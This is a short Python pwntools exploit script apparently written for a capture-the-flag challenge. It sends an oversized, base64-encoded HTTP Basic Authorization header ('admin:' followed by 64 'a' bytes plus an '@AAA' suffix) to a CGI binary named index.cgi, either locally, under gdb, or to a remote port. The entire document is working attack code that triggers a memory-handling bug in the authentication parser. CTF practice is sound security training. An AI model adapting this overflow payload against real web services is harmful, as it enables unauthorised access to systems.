#!/usr/bin/env python3

from pwn import *
import base64
import os

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF("index.cgi", checksec=False)
context.binary = exe

# host = "challs.nusgreyhats.org"
host = "127.0.0.1"
port = 32367

flag = b"admin:grey{fake_flag}"

raw = flat(
    b"admin:",
    b"a" * 0x40
)

while len(raw) % 3:
    raw += b"P"

auth_ok = base64.b64encode(flag).decode()
auth_bug = base64.b64encode(raw).decode() + "@AAA"

gdb_cmd = [
    "gdb",
    "--args",
    "/usr/bin/env",
    "-i",
    "REQUEST_METHOD=GET",
    f"HTTP_AUTHORIZATION=Basic {auth_bug}",
    exe.path,
]

def run_local_gdb():
    os.execvp("gdb", gdb_cmd)

def run_local():
    return process([
        "/usr/bin/env",
        "-i",
        "REQUEST_METHOD=GET",
        f"HTTP_AUTHORIZATION=Basic {auth_bug}",
        exe.path,
    ])

def run_remote():
    p = remote(host, port)
    req = flat(
        f"GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Authorization: Basic {auth_bug}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )
    p.send(req)
    return p

if args.REMOTE:
    p = run_remote()
    p.interactive()
else:
    if args.GDB:
        run_local_gdb()
    else:
        p = run_local()
        print(p.recvall(timeout=1).decode(errors="ignore"))